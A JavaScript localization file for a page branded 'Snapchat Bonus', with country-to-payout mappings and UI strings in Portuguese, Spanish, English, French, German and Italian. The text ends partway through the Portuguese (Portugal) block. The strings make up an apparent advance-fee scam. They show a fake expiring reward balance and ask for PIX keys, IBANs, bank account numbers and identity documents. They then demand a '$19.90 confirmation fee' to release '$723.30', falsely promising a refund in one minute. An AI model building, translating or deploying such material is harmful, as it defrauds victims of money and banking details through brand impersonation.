/* geo-i18n.js — auto locale + currency + withdraw method by IP (no manual selector) */
(function () {
  /**
   * withdraw:
   *  - PIX (Brasil)
   *  - IBAN (Europa/SEPA)
   *  - UK (Sort code + Account number)
   *  - BANK (genérico)
   *
   * withdrawMethods:
   *  Lista de métodos que aparecerão em "Adicionar método de saque".
   *  Regra de produto: fora do BR, sempre oferecer PayPal + método bancário local.
   */
  const COUNTRY_CONFIG = {
    BR: { locale: "pt-BR", currency: "USD", withdraw: "PIX", withdrawMethods: ["PIX"] },

    // LATAM / NA: PayPal + transferência bancária genérica
    AR: { locale: "es", currency: "ARS", withdraw: "BANK", withdrawMethods: ["BANK", "PAYPAL"] },
    CL: { locale: "es", currency: "CLP", withdraw: "BANK", withdrawMethods: ["BANK", "PAYPAL"] },
    CO: { locale: "es", currency: "COP", withdraw: "BANK", withdrawMethods: ["BANK", "PAYPAL"] },
    PE: { locale: "es", currency: "PEN", withdraw: "BANK", withdrawMethods: ["BANK", "PAYPAL"] },
    MX: { locale: "es", currency: "MXN", withdraw: "BANK", withdrawMethods: ["BANK", "PAYPAL"] },
    CR: { locale: "es", currency: "CRC", withdraw: "BANK", withdrawMethods: ["BANK", "PAYPAL"] },
    PA: { locale: "es", currency: "USD", withdraw: "BANK", withdrawMethods: ["BANK", "PAYPAL"] },
    US: { locale: "en", currency: "USD", withdraw: "BANK", withdrawMethods: ["BANK", "PAYPAL"] },
    CA: { locale: "en", currency: "CAD", withdraw: "BANK", withdrawMethods: ["BANK", "PAYPAL"] },

    // Europa: PayPal + IBAN
    PT: { locale: "pt-PT", currency: "USD", withdraw: "IBAN", withdrawMethods: ["IBAN", "PAYPAL"] },
    ES: { locale: "es", currency: "USD", withdraw: "IBAN", withdrawMethods: ["IBAN", "PAYPAL"] },
    FR: { locale: "fr", currency: "USD", withdraw: "IBAN", withdrawMethods: ["IBAN", "PAYPAL"] },
    DE: { locale: "de", currency: "USD", withdraw: "IBAN", withdrawMethods: ["IBAN", "PAYPAL"] },
    IT: { locale: "it", currency: "USD", withdraw: "IBAN", withdrawMethods: ["IBAN", "PAYPAL"] },

    // UK: PayPal + UK bank
    GB: { locale: "en-GB", currency: "GBP", withdraw: "UK", withdrawMethods: ["UK", "PAYPAL"] }
  };

  // ------------------------------------------------------------
  // i18n
  // ------------------------------------------------------------
  const I18N = {
    "pt-BR": {
      "app.title": "Snapchat Bônus",
      "balance.title": "Seu saldo",
      "balance.expire": "SEU SALDO EXPIRA EM",
      "balance.last_reward": "Última recompensa:",
      "action.withdraw": "Sacar",
      "action.withdraw_money": "Sacar dinheiro",
      "status.completed": "Concluído",
      "status.unavailable": "Indisponível",
      "congrats.title": "Parabéns!",
      "congrats.subtitle": "Você concluiu",
      "congrats.subtitle.nobreak": "todas as tarefas",
      "checkin.text": "Entre por 14 dias para ganhar",
      "checkin.completed": "Você concluiu todos os dias de check-in.",
      "timer.expires_in": "Expira em",
      "title.redeem": "Resgatar recompensas",
      "task.ads": "Vê anúncios direcionados diariamente para ganhares até",
      "task.watch_videos": "Assistir vídeos",
      "task.redeem_rewards": "Resgate suas recompensas e ganhe",
      "task.search_daily": "Faça 60 pesquisas diárias para ganhar até",
      "task.invite": "Convide 1 amigo para se inscrever e ganhar",
      "hint.watch_10min": "Assista por 10 min",
      "hint.up_to_points": "Até {n} pontos",
      "unit.points": "pontos",
      "unit.searches": "pesquisas",
      "search.rule": "Obtém 21 pontos por escreveres uma consulta na barra de pesquisa, ou 0 ponto por tocares numa pesquisa sugerida, como em \"Podes gostar\".",
      "withdraw.add_method": "Adicionar método de saque",
      "withdraw.rule": "Para sacar dinheiro, você precisa de um saldo mínimo de {min}. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.",
      "withdraw.method.pix": "PIX",
      "withdraw.text": "Sacar Dinheiro",
      "charge.text": "Recarga Móvel",
      "withdraw.method.pix_sub": "Recebimento Imediato",
      "withdraw.method.bank": "Transferência bancária",
      "withdraw.method.iban": "Transferência bancária (IBAN)",
      "withdraw.method.uk": "Transferência bancária (UK)",
      "withdraw.method.paypal": "PayPal",
      "withdraw.method.paypal_sub": "Recebimento por e-mail",
      "withdraw.link.pix": "Vincular cuenta",
      "withdraw.link.bank": "Vincular conta",
      "withdraw.link.iban": "Vincular IBAN",
      "withdraw.link.uk": "Vincular conta (UK)",
      "withdraw.link.paypal": "Vincular PayPal",
      "form.name": "Nome",
      "form.pix_key_type": "Tipo de Chave PIX",
      "form.pix_key": "Chave PIX",
      "form.iban": "IBAN",
      "form.sort_code": "Sort code",
      "form.account_number": "Account number",
      "form.document": "Documento",
      "form.paypal_email": "E-mail do PayPal",
      "name.complete": "Nome completo",
      "live.title": "Obtenha Moedas para a LIVE",
      "live.desc": "Use Moedas para enviar presentes virtuais para seus hosts de live favoritos.",
      "mobile.topup": "Recarga móvel",
      "mobile.rule": "Você precisa de um saldo mínimo de {min} para recarga de celular",
      "loading.validating": "Validando acesso...",
      "loading.steps.validating": "Validando dados...",
      "loading.steps.connecting": "Conectando ao servidor...",
      "loading.steps.finishing": "Finalizando saque...",
      "loading.steps.almost": "Quase pronto...",
      "popup.title": "Gol de Prêmios",
      "popup.text": "Parabéns! Como parte de uma campanha de recompensas exclusiva.",
      "popup.expires": "Expira em",
      "popup.thanks": "Obrigado",
      "timer.expired": "Expirado",
      "loader.validating": "Validando suas informações",
      "loader.withdrawing": "Concluindo saque",
      "loader.processing": "Processando transação",
      "loader.finishing": "Finalizando",
      "confirmation.balance_title": "SALDO DISPONÍVEL",
      "confirmation.balance_subtitle": "Aguardando confirmação para saque",
      "confirmation.identity_title": "CONFIRMAÇÃO DE IDENTIDADE",
      "confirmation.refundable_badge": "VALOR REEMBOLSÁVEL",
      "confirmation.fee_part1": "Taxa obrigatória para liberação do saque no valor de",
      "confirmation.fee_part2": ". O valor de",
      "confirmation.fee_part3": "será reembolsado integralmente para você em 1 minuto.",
      "confirmation.refund_data_title": "DADOS PARA REEMBOLSO",
      "confirmation.receipt.name": "Nome",
      "confirmation.receipt.date": "Data",
      "confirmation.receipt.pix_key": "Chave PIX",
      "confirmation.receipt.amount": "Valor a receber",
      "confirmation.process_title": "PROCESSO DE LIBERAÇÃO",
      "confirmation.step1_title": "Pagar taxa de confirmação",
      "confirmation.step1_desc": "$19.90 para verificação de identidade",
      "confirmation.step2_title": "Receber reembolso automático",
      "confirmation.step2_desc": "Valor devolvido em 1 minuto",
      "confirmation.step3_title": "Acessar saldo completo",
      "confirmation.step3_desc": "$723.30 liberado para saque",
      "confirmation.cta": "Pagar taxa para Liberar Saque",
      "confirmation.timer": "⏱️ Reembolso automático em 1 minuto",
      "confirmation.success": "✅ Identidade confirmada. $19.90 reembolsados e saque liberado.",
      "confirmation.secure": "Processo 100% seguro",
      "confirmation.help": "Precisa de ajuda?"
    },
    "es": {
      "app.title": "Bono de Snapchat",
      "balance.title": "Tu saldo",
      "balance.expire": "TU SALDO EXPIRA EN",
      "balance.last_reward": "Última recompensa:",
      "action.withdraw": "Retirar",
      "action.withdraw_money": "Retirar dinero",
      "status.completed": "Completado",
      "status.unavailable": "No disponible",
      "congrats.title": "¡Felicidades!",
      "congrats.subtitle": "Has completado",
      "congrats.subtitle.nobreak": "todas las tareas",
      "checkin.text": "Entra durante 14 días para ganar",
      "checkin.completed": "Has completado todos los días de check-in.",
      "timer.expires_in": "Expira en",
      "title.redeem": "Canjear recompensas",
      "task.ads": "Mira anuncios dirigidos a diario para ganar hasta",
      "task.watch_videos": "Ver videos",
      "task.redeem_rewards": "Canjea tus recompensas y gana",
      "task.search_daily": "Haz 60 búsquedas diarias para ganar hasta",
      "task.invite": "Invita a 1 amigo a registrarse y ganar",
      "hint.watch_10min": "Mira durante 10 min",
      "hint.up_to_points": "Hasta {n} puntos",
      "unit.points": "puntos",
      "unit.searches": "búsquedas",
      "search.rule": "Obtén 21 puntos por escribir una búsqueda en la barra de búsqueda, o 0 puntos por tocar una búsqueda sugerida, como \"Podría gustarte\".",
      "withdraw.add_method": "Añadir método de retiro",
      "withdraw.rule": "Para retirar dinero, necesitas un saldo mínimo de {min}. Los límites pueden variar según el país o región.",
      "withdraw.method.pix": "Transferencia",
      "withdraw.text": "Retirar Dinero",
      "charge.text": "Recarga Móvil",
      "withdraw.method.pix_sub": "Recepción inmediata",
      "withdraw.method.bank": "Transferencia bancaria",
      "withdraw.method.iban": "Transferencia bancaria (IBAN)",
      "withdraw.method.uk": "Transferencia bancaria (UK)",
      "withdraw.method.paypal": "PayPal",
      "withdraw.method.paypal_sub": "Recibir por e-mail",
      "withdraw.link.pix": "Vincular cuenta",
      "withdraw.link.bank": "Vincular cuenta",
      "withdraw.link.iban": "Vincular IBAN",
      "withdraw.link.uk": "Vincular cuenta (UK)",
      "withdraw.link.paypal": "Vincular PayPal",
      "name.complete": "Nombre completo",
      "form.name": "Nombre",
      "form.pix_key_type": "Tipo de clave",
      "form.pix_key": "Clave de transferencia",
      "form.iban": "IBAN",
      "form.sort_code": "Sort code",
      "form.account_number": "Account number",
      "form.document": "Documento",
      "form.paypal_email": "Correo de PayPal",
      "live.title": "Obtén monedas para LIVE",
      "live.desc": "Usa monedas para enviar regalos virtuales a tus anfitriones de live favoritos.",
      "mobile.topup": "Recarga móvil",
      "mobile.rule": "Necesitas un saldo mínimo de {min} para recargar el móvil",
      "loading.validating": "Validando acceso...",
      "loading.steps.validating": "Validando datos...",
      "loading.steps.connecting": "Conectando al servidor...",
      "loading.steps.finishing": "Finalizando retiro...",
      "loading.steps.almost": "Casi listo...",
      "popup.title": "Gol de Premios",
      "popup.text": "¡Felicidades! Como parte de una campaña de recompensas exclusiva.",
      "popup.expires": "Expira en",
      "popup.thanks": "Gracias",
      "timer.expired": "Caducado",
      "loader.validating": "Validando tu información",
      "loader.withdrawing": "Completando retiro",
      "loader.processing": "Procesando transacción",
      "loader.finishing": "Finalizando",
      "confirmation.balance_title": "SALDO DISPONIBLE",
      "confirmation.balance_subtitle": "Esperando confirmación para retiro",
      "confirmation.identity_title": "CONFIRMACIÓN DE IDENTIDAD",
      "confirmation.refundable_badge": "VALOR REEMBOLSABLE",
      "confirmation.fee_part1": "Tasa obligatoria para liberar el retiro por el valor de",
      "confirmation.fee_part2": ". El valor de",
      "confirmation.fee_part3": "será reembolsado íntegramente en 1 minuto.",
      "confirmation.refund_data_title": "DATOS PARA REEMBOLSO",
      "confirmation.receipt.name": "Nombre",
      "confirmation.receipt.date": "Fecha",
      "confirmation.receipt.pix_key": "Clave de transferencia",
      "confirmation.receipt.amount": "Valor a recibir",
      "confirmation.process_title": "PROCESO DE LIBERACIÓN",
      "confirmation.step1_title": "Pagar tasa de confirmación",
      "confirmation.step1_desc": "$19.90 para verificación de identidad",
      "confirmation.step2_title": "Recibir reembolso automático",
      "confirmation.step2_desc": "Valor devuelto en 1 minuto",
      "confirmation.step3_title": "Acceder al saldo completo",
      "confirmation.step3_desc": "$723.30 liberado para retiro",
      "confirmation.cta": "Pagar tasa para liberar retiro",
      "confirmation.timer": "⏱️ Reembolso automático en 1 minuto",
      "confirmation.success": "✅ Identidad confirmada. $19.90 reembolsados y retiro liberado.",
      "confirmation.secure": "Proceso 100% seguro",
      "confirmation.help": "¿Necesitas ayuda?"
    },
    "en": {
      "app.title": "Snapchat Bonus",
      "balance.title": "Your balance",
      "balance.expire": "YOUR BALANCE EXPIRES IN",
      "balance.last_reward": "Last reward:",
      "action.withdraw": "Withdraw",
      "action.withdraw_money": "Withdraw money",
      "status.completed": "Completed",
      "status.unavailable": "Unavailable",
      "congrats.title": "Congratulations!",
      "congrats.subtitle": "You completed",
      "congrats.subtitle.nobreak": "all tasks",
      "checkin.text": "Check in for 14 days to earn",
      "checkin.completed": "You completed all check-in days.",
      "timer.expires_in": "Expires in",
      "title.redeem": "Redeem rewards",
      "task.ads": "Watch targeted ads daily to earn up to",
      "task.watch_videos": "Watch videos",
      "task.redeem_rewards": "Redeem your rewards and earn",
      "task.search_daily": "Do 60 searches daily to earn up to",
      "task.invite": "Invite 1 friend to sign up and earn",
      "hint.watch_10min": "Watch for 10 min",
      "hint.up_to_points": "Up to {n} points",
      "unit.points": "points",
      "unit.searches": "searches",
      "search.rule": "Get 21 points for typing a search in the search bar, or 0 points for tapping a suggested search, like \"You might like\".",
      "withdraw.add_method": "Add withdrawal method",
      "withdraw.rule": "To withdraw money, you need a minimum balance of {min}. Limits may vary by country or region.",
      "withdraw.method.pix": "Transfer",
      "withdraw.text": "Withdraw Money",
      "charge.text": "Mobile Recharge",
      "withdraw.method.pix_sub": "Instant receiving",
      "withdraw.method.bank": "Bank transfer",
      "withdraw.method.iban": "Bank transfer (IBAN)",
      "withdraw.method.uk": "Bank transfer (UK)",
      "withdraw.method.paypal": "PayPal",
      "withdraw.method.paypal_sub": "Receive by email",
      "withdraw.link.pix": "Link contact",
      "withdraw.link.bank": "Link bank account",
      "withdraw.link.iban": "Link IBAN",
      "withdraw.link.uk": "Link UK account",
      "withdraw.link.paypal": "Link PayPal",
      "form.name": "Full name",
      "form.pix_key_type": "Key type",
      "form.pix_key": "Transfer key",
      "form.iban": "IBAN",
      "form.sort_code": "Sort code",
      "form.account_number": "Account number",
      "form.document": "Document",
      "form.paypal_email": "PayPal email",
      "name.complete": "Full name",
      "live.title": "Get LIVE Coins",
      "live.desc": "Use coins to send virtual gifts to your favorite live hosts.",
      "mobile.topup": "Mobile top-up",
      "mobile.rule": "You need a minimum balance of {min} to top up your phone",
      "loading.validating": "Validating access...",
      "loading.steps.validating": "Validating data...",
      "loading.steps.connecting": "Connecting to server...",
      "loading.steps.finishing": "Finalizing withdrawal...",
      "loading.steps.almost": "Almost ready...",
      "popup.title": "Prize Goal",
      "popup.text": "Congratulations! As part of an exclusive rewards campaign.",
      "popup.expires": "Expires in",
      "popup.thanks": "Thank you",
      "timer.expired": "Expired",
      "loader.validating": "Validating your information",
      "loader.withdrawing": "Completing withdrawal",
      "loader.processing": "Processing transaction",
      "loader.finishing": "Finishing",
      "confirmation.balance_title": "AVAILABLE BALANCE",
      "confirmation.balance_subtitle": "Waiting for withdrawal confirmation",
      "confirmation.identity_title": "IDENTITY CONFIRMATION",
      "confirmation.refundable_badge": "REFUNDABLE AMOUNT",
      "confirmation.fee_part1": "Mandatory fee to unlock the withdrawal of",
      "confirmation.fee_part2": ". The amount of",
      "confirmation.fee_part3": "will be fully refunded to you in 1 minute.",
      "confirmation.refund_data_title": "REFUND DETAILS",
      "confirmation.receipt.name": "Name",
      "confirmation.receipt.date": "Date",
      "confirmation.receipt.pix_key": "Transfer key",
      "confirmation.receipt.amount": "Amount to receive",
      "confirmation.process_title": "RELEASE PROCESS",
      "confirmation.step1_title": "Pay confirmation fee",
      "confirmation.step1_desc": "$19.90 for identity verification",
      "confirmation.step2_title": "Receive automatic refund",
      "confirmation.step2_desc": "Amount returned in 1 minute",
      "confirmation.step3_title": "Access full balance",
      "confirmation.step3_desc": "$723.30 released for withdrawal",
      "confirmation.cta": "Pay fee to unlock withdrawal",
      "confirmation.timer": "⏱️ Automatic refund in 1 minute",
      "confirmation.success": "✅ Identity confirmed. $19.90 refunded and withdrawal unlocked.",
      "confirmation.secure": "100% secure process",
      "confirmation.help": "Need help?"
    },
    "fr": {
      "app.title": "Bonus Snapchat",
      "balance.title": "Votre solde",
      "balance.expire": "VOTRE SOLDE EXPIRE DANS",
      "balance.last_reward": "Dernière récompense :",
      "action.withdraw": "Retirer",
      "action.withdraw_money": "Retirer de l'argent",
      "status.completed": "Terminé",
      "status.unavailable": "Indisponible",
      "congrats.title": "Félicitations !",
      "congrats.subtitle": "Vous avez terminé",
      "congrats.subtitle.nobreak": "toutes les tâches",
      "checkin.text": "Connectez-vous pendant 14 jours pour gagner",
      "checkin.completed": "Vous avez effectué tous les jours de check-in.",
      "timer.expires_in": "Expire dans",
      "title.redeem": "Récupérer les récompenses",
      "task.ads": "Regardez des publicités ciblées chaque jour pour gagner jusqu'à",
      "task.watch_videos": "Regarder des vidéos",
      "task.redeem_rewards": "Récupérez vos récompenses et gagnez",
      "task.search_daily": "Faites 60 recherches par jour pour gagner jusqu'à",
      "task.invite": "Invitez 1 ami à s'inscrire et gagnez",
      "hint.watch_10min": "Regardez pendant 10 min",
      "hint.up_to_points": "Jusqu'à {n} points",
      "unit.points": "points",
      "unit.searches": "recherches",
      "search.rule": "Obtenez 21 points en saisissant une recherche dans la barre de recherche, ou 0 point en touchant une recherche suggérée, comme « Vous pourriez aimer ».",
      "withdraw.add_method": "Ajouter un mode de retrait",
      "withdraw.rule": "Pour retirer de l'argent, vous devez avoir un solde minimum de {min}. Les limites peuvent varier selon le pays ou la région.",
      "withdraw.method.pix": "PIX",
      "withdraw.text": "Prendre de l'argent",
      "charge.text": "Recharge mobile",
      "withdraw.method.pix_sub": "Réception immédiate",
      "withdraw.method.bank": "Virement bancaire",
      "withdraw.method.iban": "Virement bancaire (IBAN)",
      "withdraw.method.uk": "Virement bancaire (UK)",
      "form.name": "Nom",
      "form.pix_key_type": "Type de clé PIX",
      "form.pix_key": "Clé PIX",
      "form.iban": "IBAN",
      "form.sort_code": "Sort code",
      "form.account_number": "Account number",
      "form.document": "Document",
      "form.paypal_email": "E-mail PayPal",
      "name.complete": "Nombre completo",
      "live.title": "Obtenir des pièces LIVE",
      "live.desc": "Utilisez des pièces pour envoyer des cadeaux virtuels à vos hôtes live préférés.",
      "mobile.topup": "Recharge mobile",
      "mobile.rule": "Vous devez avoir un solde minimum de {min} pour recharger votre mobile",
      "loading.validating": "Validation de l'accès...",
      "loading.steps.validating": "Validation des données...",
      "loading.steps.connecting": "Connexion au serveur...",
      "loading.steps.finishing": "Finalisation du retrait...",
      "loading.steps.almost": "Quasiment prêt...",
      "popup.title": "But de Récompenses",
      "popup.text": "Félicitations ! Dans le cadre d’une campagne de récompenses exclusive.",
      "popup.expires": "Expire dans",
      "popup.thanks": "Merci",
      "timer.expired": "Expiré",
      "loader.validating": "Validation de vos informations",
      "loader.withdrawing": "Finalisation du retrait",
      "loader.processing": "Traitement de la transaction",
      "loader.finishing": "Finalisation",
      "confirmation.balance_title": "SOLDE DISPONIBLE",
      "confirmation.balance_subtitle": "En attente de confirmation de retrait",
      "confirmation.identity_title": "CONFIRMATION D’IDENTITÉ",
      "confirmation.refundable_badge": "MONTANT REMBOURSABLE",
      "confirmation.fee_part1": "Frais obligatoires pour débloquer le retrait de",
      "confirmation.fee_part2": ". Le montant de",
      "confirmation.fee_part3": "vous sera intégralement remboursé en 1 minute.",
      "confirmation.refund_data_title": "DONNÉES DE REMBOURSEMENT",
      "confirmation.receipt.name": "Nom",
      "confirmation.receipt.date": "Date",
      "confirmation.receipt.pix_key": "Clé PIX",
      "confirmation.receipt.amount": "Montant à recevoir",
      "confirmation.process_title": "PROCESSUS DE DÉBLOCAGE",
      "confirmation.step1_title": "Payer les frais de confirmation",
      "confirmation.step1_desc": "$19.90 pour la vérification d’identité",
      "confirmation.step2_title": "Recevoir un remboursement automatique",
      "confirmation.step2_desc": "Montant remboursé en 1 minute",
      "confirmation.step3_title": "Accéder au solde complet",
      "confirmation.step3_desc": "$723.30 débloqué pour le retrait",
      "confirmation.cta": "Payer les frais pour débloquer le retrait",
      "confirmation.timer": "⏱️ Remboursement automatique en 1 minute",
      "confirmation.success": "✅ Identité confirmée. $19.90 remboursés et retrait débloqué.",
      "confirmation.secure": "Processus 100% sécurisé",
      "confirmation.help": "Besoin d’aide ?"
    },
    "de": {
      "app.title": "Snapchat-Bonus",
      "balance.title": "Ihr Guthaben",
      "balance.expire": "IHR GUTHABEN LÄUFT AB IN",
      "balance.last_reward": "Letzte Belohnung:",
      "action.withdraw": "Auszahlen",
      "action.withdraw_money": "Geld auszahlen",
      "status.completed": "Abgeschlossen",
      "status.unavailable": "Nicht verfügbar",
      "congrats.title": "Glückwunsch!",
      "congrats.subtitle": "Sie haben alle",
      "congrats.subtitle.nobreak": "Aufgaben abgeschlossen",
      "checkin.text": "14 Tage einloggen, um zu verdienen",
      "checkin.completed": "Sie haben alle Check-in-Tage abgeschlossen.",
      "timer.expires_in": "Läuft ab in",
      "title.redeem": "Belohnungen einlösen",
      "task.ads": "Schauen Sie täglich gezielte Anzeigen, um bis zu",
      "task.watch_videos": "Videos ansehen",
      "task.redeem_rewards": "Lösen Sie Ihre Belohnungen ein und erhalten Sie",
      "task.search_daily": "Machen Sie täglich 60 Suchen, um bis zu",
      "task.invite": "Laden Sie 1 Freund ein, sich anzumelden und zu verdienen",
      "hint.watch_10min": "10 Min ansehen",
      "hint.up_to_points": "Bis zu {n} Punkte",
      "unit.points": "Punkte",
      "unit.searches": "Suchen",
      "search.rule": "Erhalten Sie 21 Punkte, wenn Sie eine Suche in die Suchleiste eingeben, oder 0 Punkte, wenn Sie eine vorgeschlagene Suche antippen, wie „Das könnte Ihnen gefallen“.",
      "withdraw.add_method": "Auszahlungsmethode hinzufügen",
      "withdraw.rule": "Um Geld abzuheben, benötigen Sie ein Mindestguthaben von {min}. Die Limits können je nach Land oder Region variieren.",
      "withdraw.method.pix": "PIX",
      "withdraw.text": "Geld abheben",
      "charge.text": "Mobiles Aufladen",
      "withdraw.method.pix_sub": "Sofortiger Empfang",
      "withdraw.method.bank": "Banküberweisung",
      "withdraw.method.iban": "Banküberweisung (IBAN)",
      "withdraw.method.uk": "Banküberweisung (UK)",
      "form.name": "Name",
      "form.pix_key_type": "PIX-Schlüsseltyp",
      "form.pix_key": "PIX-Schlüssel",
      "form.iban": "IBAN",
      "form.sort_code": "Sort code",
      "form.account_number": "Account number",
      "form.document": "Dokument",
      "form.paypal_email": "PayPal-E-Mail",
      "name.complete": "Vollständiger Name",
      "live.title": "LIVE-Münzen erhalten",
      "live.desc": "Verwenden Sie Münzen, um virtuelle Geschenke an Ihre Lieblings-Live-Hosts zu senden.",
      "mobile.topup": "Mobil aufladen",
      "mobile.rule": "Sie benötigen ein Mindestguthaben von {min}, um Ihr Handy aufzuladen",
      "loading.validating": "Zugriff wird überprüft...",
      "loading.steps.validating": "Daten werden überprüft...",
      "loading.steps.connecting": "Verbindung zum Server wird hergestellt...",
      "loading.steps.finishing": "Abhebung wird abgeschlossen...",
      "loading.steps.almost": "Fast fertig...",
      "popup.title": "Prämien-Tor",
      "popup.text": "Glückwunsch! Als Teil einer exklusiven Belohnungskampagne.",
      "popup.expires": "Läuft ab in",
      "popup.thanks": "Danke",
      "timer.expired": "Abgelaufen",
      "loader.validating": "Ihre Informationen werden überprüft",
      "loader.withdrawing": "Auszahlung wird abgeschlossen",
      "loader.processing": "Transaktion wird verarbeitet",
      "loader.finishing": "Wird abgeschlossen",
      "confirmation.balance_title": "VERFÜGBARES GUTHABEN",
      "confirmation.balance_subtitle": "Warten auf Auszahlungsbestätigung",
      "confirmation.identity_title": "IDENTITÄTSBESTÄTIGUNG",
      "confirmation.refundable_badge": "RÜCKERSTATTBARER BETRAG",
      "confirmation.fee_part1": "Pflichtgebühr zur Freischaltung der Auszahlung von",
      "confirmation.fee_part2": ". Der Betrag von",
      "confirmation.fee_part3": "wird Ihnen innerhalb von 1 Minute vollständig erstattet.",
      "confirmation.refund_data_title": "RÜCKERSTATTUNGSDATEN",
      "confirmation.receipt.name": "Name",
      "confirmation.receipt.date": "Datum",
      "confirmation.receipt.pix_key": "PIX-Schlüssel",
      "confirmation.receipt.amount": "Auszahlungsbetrag",
      "confirmation.process_title": "FREIGABEPROZESS",
      "confirmation.step1_title": "Bestätigungsgebühr zahlen",
      "confirmation.step1_desc": "$19.90 zur Identitätsprüfung",
      "confirmation.step2_title": "Automatische Rückerstattung erhalten",
      "confirmation.step2_desc": "Betrag in 1 Minute zurück",
      "confirmation.step3_title": "Vollständiges Guthaben öffnen",
      "confirmation.step3_desc": "$723.30 zur Auszahlung freigegeben",
      "confirmation.cta": "Gebühr zahlen, um Auszahlung freizuschalten",
      "confirmation.timer": "⏱️ Automatische Rückerstattung in 1 Minute",
      "confirmation.success": "✅ Identität bestätigt. $19.90 erstattet und Auszahlung freigeschaltet.",
      "confirmation.secure": "100 % sicherer Prozess",
      "confirmation.help": "Brauchen Sie Hilfe?"
    },
    "it": {
      "app.title": "Bonus Snapchat",
      "balance.title": "Il tuo saldo",
      "balance.expire": "IL TUO SALDO SCADE TRA",
      "balance.last_reward": "Ultima ricompensa:",
      "action.withdraw": "Preleva",
      "action.withdraw_money": "Preleva denaro",
      "status.completed": "Completato",
      "status.unavailable": "Non disponibile",
      "congrats.title": "Congratulazioni!",
      "congrats.subtitle": "Hai completato",
      "congrats.subtitle.nobreak": "tutte le attività",
      "checkin.text": "Accedi per 14 giorni per guadagnare",
      "checkin.completed": "Hai completato tutti i giorni di check-in.",
      "timer.expires_in": "Scade tra",
      "title.redeem": "Riscattare ricompense",
      "task.ads": "Guarda annunci mirati ogni giorno per guadagnare fino a",
      "task.watch_videos": "Guarda video",
      "task.redeem_rewards": "Riscatta le tue ricompense e ottieni",
      "task.search_daily": "Fai 60 ricerche giornaliere per guadagnare fino a",
      "task.invite": "Invita 1 amico a iscriversi e guadagnare",
      "hint.watch_10min": "Guarda per 10 min",
      "hint.up_to_points": "Fino a {n} punti",
      "unit.points": "punti",
      "unit.searches": "ricerche",
      "search.rule": "Ottieni 21 punti scrivendo una ricerca nella barra di ricerca, oppure 0 punti toccando una ricerca suggerita, come \"Potrebbe piacerti\".",
      "withdraw.add_method": "Aggiungi metodo di prelievo",
      "withdraw.rule": "Per prelevare denaro è necessario un saldo minimo di {min}. I limiti possono variare in base al paese o alla regione.",
      "withdraw.method.pix": "PIX",
      "withdraw.text": "Prelevare denaro",
      "charge.text": "Ricarica cellulare",
      "withdraw.method.pix_sub": "Ricezione immediata",
      "withdraw.method.bank": "Bonifico bancario",
      "withdraw.method.iban": "Bonifico bancario (IBAN)",
      "withdraw.method.uk": "Bonifico bancario (UK)",
      "form.name": "Nome",
      "form.pix_key_type": "Tipo di chiave PIX",
      "form.pix_key": "Chiave PIX",
      "form.iban": "IBAN",
      "form.sort_code": "Sort code",
      "form.account_number": "Account number",
      "form.document": "Documento",
      "form.paypal_email": "E-mail PayPal",
      "name.complete": "Nome completo",
      "live.title": "Ottieni monete LIVE",
      "live.desc": "Usa le monete per inviare regali virtuali ai tuoi host live preferiti.",
      "mobile.topup": "Ricarica mobile",
      "mobile.rule": "È necessario un saldo minimo di {min} per la ricarica del cellulare",
      "loading.validating": "Verifica dell'accesso...",
      "loading.steps.validating": "Verifica dell'accesso...",
      "loading.steps.connecting": "Connessione al server...",
      "loading.steps.finishing": "Finalizzazione...",
      "loading.steps.almost": "Quasi pronto...",
      "popup.title": "Gol dei Premi",
      "popup.text": "Congratulazioni! Come parte di una campagna di premi esclusiva.",
      "popup.expires": "Scade tra",
      "popup.thanks": "Grazie",
      "timer.expired": "Scaduto",
      "loader.validating": "Verifica delle informazioni",
      "loader.withdrawing": "Completamento del prelievo",
      "loader.processing": "Elaborazione della transazione",
      "loader.finishing": "Finalizzazione",
      "confirmation.balance_title": "SALDO DISPONIBILE",
      "confirmation.balance_subtitle": "In attesa di conferma del prelievo",
      "confirmation.identity_title": "CONFERMA IDENTITÀ",
      "confirmation.refundable_badge": "IMPORTO RIMBORSABILE",
      "confirmation.fee_part1": "Tassa obbligatoria per sbloccare il prelievo di",
      "confirmation.fee_part2": ". L’importo di",
      "confirmation.fee_part3": "sarà rimborsato integralmente in 1 minuto.",
      "confirmation.refund_data_title": "DATI PER IL RIMBORSO",
      "confirmation.receipt.name": "Nome",
      "confirmation.receipt.date": "Data",
      "confirmation.receipt.pix_key": "Chiave PIX",
      "confirmation.receipt.amount": "Importo da ricevere",
      "confirmation.process_title": "PROCESSO DI SBLOCCO",
      "confirmation.step1_title": "Pagare la tassa di conferma",
      "confirmation.step1_desc": "$19.90 per la verifica dell’identità",
      "confirmation.step2_title": "Ricevere rimborso automatico",
      "confirmation.step2_desc": "Importo restituito in 1 minuto",
      "confirmation.step3_title": "Accedere al saldo completo",
      "confirmation.step3_desc": "$723.30 sbloccato per il prelievo",
      "confirmation.cta": "Paga la tassa per sbloccare il prelievo",
      "confirmation.timer": "⏱️ Rimborso automatico in 1 minuto",
      "confirmation.success": "✅ Identità confermata. $19.90 rimborsati e prelievo sbloccato.",
      "confirmation.secure": "Processo 100% sicuro",
      "confirmation.help": "Hai bisogno di aiuto?"
    },
    "pt-PT": {
      "app.title": "Bónus Snapchat",
      "balance.title": "O seu saldo",
      "balance.expire": "O SEU SALDO EXPIRA EM",
      "balance.last_reward": "Última recompensa: {min}",
      "action.withdraw": "Levantar",
      "action.withdraw_money": "Levantar dinheiro",
      "status.completed": "Concluído",
      "status.unavailable": "Indisponível",
      "congrats.title": "Parabéns!",
      "congrats.subtitle": "Concluiu",
      "congrats.subtitle.nobreak": "todas as tarefas",
      "checkin.text": "Entre durante 14 dias para ganhar",
      "checkin.completed": "Concluiu todos os dias de check-in.",
      "timer.expires_in": "Expira em",
      "title.redeem": "Resgatar recompensas",
      "task.ads": "Veja anúncios direcionados diariamente para ganhar até",
      "task.watch_videos": "Ver vídeos",
      "task.redeem_rewards": "Resgate as suas recompensas e ganhe",
      "task.search_daily": "Faça 60 pesquisas diárias para ganhar até",
      "task.invite": "Convide 1 amigo para se inscrever e ganhar",
      "hint.watch_10min": "Assista por 10 min",
      "hint.up_to_points": "Até {n} pontos",
      "unit.points": "pontos",
      "unit.searches": "pesquisas",
      "search.rule": "Obtém 21 pontos por escrever uma pesquisa na barra de pesquisa, ou 0 pontos por tocar numa pesquisa sugerida, como \"Podes gostar\".",
      "withdraw.add_method": "Adicionar método de levantamento",
      "withdraw.rule": "Para levantar dinheiro, necessita de um saldo mínimo de {min}. Os limites podem variar conforme o país ou região.",
      "withdraw.method.pix": "PIX",
